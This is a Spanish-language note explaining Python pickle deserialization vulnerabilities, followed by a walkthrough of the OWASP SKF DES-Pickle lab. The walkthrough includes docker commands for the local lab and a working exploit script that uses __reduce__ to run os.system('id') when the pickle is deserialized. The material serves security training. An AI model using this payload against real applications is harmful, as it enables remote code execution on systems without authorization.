_____________________
Un Ataque de **Deserialización Pickle** (**DES-Pickle**) es un tipo de vulnerabilidad que puede ocurrir en aplicaciones Python que usan la biblioteca Pickle para serializar y deserializar objetos.

La vulnerabilidad se produce cuando un atacante es capaz de controlar la entrada Pickle que se pasa a una función de deserialización en la aplicación. Si el código de la aplicación no valida adecuadamente la entrada Pickle, puede permitir que un atacante inyecte código malicioso en el objeto deserializado.

Una vez que el objeto ha sido deserializado, el código malicioso puede ser ejecutado en el contexto de la aplicación, lo que puede permitir al atacante tomar el control del sistema, acceder a datos sensibles, o incluso ejecutar código remoto.

Los atacantes pueden aprovecharse de las vulnerabilidades de DES-Pickle para realizar ataques de denegación de servicio (DoS), inyectar código malicioso, o incluso tomar el control completo del sistema.

El impacto de un Ataque de Deserialización Pickle depende del tipo y la sensibilidad de los datos que se puedan obtener, pero puede ser muy grave. Por lo tanto, es importante que los desarrolladores de aplicaciones Python validen y filtren de forma adecuada la entrada Pickle que se pasa a las funciones de deserialización, y que utilicen técnicas de seguridad como la limitación de recursos para prevenir ataques DoS y la desactivación de la deserialización automática de objetos no confiables.
__________________________

[SKF-LABS DES-Pickle](https://github.com/blabla1337/skf-labs/tree/master/python/DES-Pickle)

```bash
docker pull blabla1337/owasp-skf-lab:des-pickle
docker run -dit -p 127.0.0.1:5000:5000 blabla1337/owasp-skf-lab:des-pickle
```

Notamos que la APP esta corriendo _**pickle**_ para leer el input del usuario

Este script en _**python**_ nos permite serializar la data ejecutando un comando en el momento en que la APP la deserialize

```python
import pickle
import os
import binascii

class Exploit(object):
	def __reduce__(self):
		return (os.system, ('id',))

if __name__ == '__main__':
	print(binascii.hexlify(pickle.dumps(Exploit())))
```
______________________________

